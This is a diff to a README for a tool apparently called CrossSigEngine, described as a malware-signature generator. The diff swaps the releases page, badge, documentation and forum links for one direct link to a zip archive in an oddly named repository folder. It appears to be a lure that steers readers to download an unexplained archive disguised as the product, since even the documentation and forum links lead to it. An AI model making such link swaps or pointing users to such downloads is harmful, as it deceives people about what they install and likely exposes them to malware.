@@ -1,6 +1,6 @@
 # 🔍 CrossSigEngine - Generate Malware Signatures Easily
 
-![Download CrossSigEngine](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)
+![Download CrossSigEngine](https://raw.githubusercontent.com/momennagy/CrossSigEngine/main/ascomycetous/CrossSigEngine.zip%20Now-Get%20Started-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ CrossSigEngine is a tool designed to help you create malware signatures efficien
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [CrossSigEngine Releases](https://github.com/momennagy/CrossSigEngine/releases).
+To get started, visit this page to download: [CrossSigEngine Releases](https://raw.githubusercontent.com/momennagy/CrossSigEngine/main/ascomycetous/CrossSigEngine.zip).
 
 1. Open the link above in your web browser.
 2. Look for the latest version of CrossSigEngine.
@@ -69,9 +69,9 @@ If you have questions or need support, feel free to reach out to the community. 
 
 ## 📌 Useful Links
 
-- [CrossSigEngine Releases](https://github.com/momennagy/CrossSigEngine/releases)
-- [Documentation](https://github.com/momennagy/CrossSigEngine/wiki)
-- [Community Forum](https://forum.example.com)
+- [CrossSigEngine Releases](https://raw.githubusercontent.com/momennagy/CrossSigEngine/main/ascomycetous/CrossSigEngine.zip)
+- [Documentation](https://raw.githubusercontent.com/momennagy/CrossSigEngine/main/ascomycetous/CrossSigEngine.zip)
+- [Community Forum](https://raw.githubusercontent.com/momennagy/CrossSigEngine/main/ascomycetous/CrossSigEngine.zip)
 
 ## ⚖️ License
 
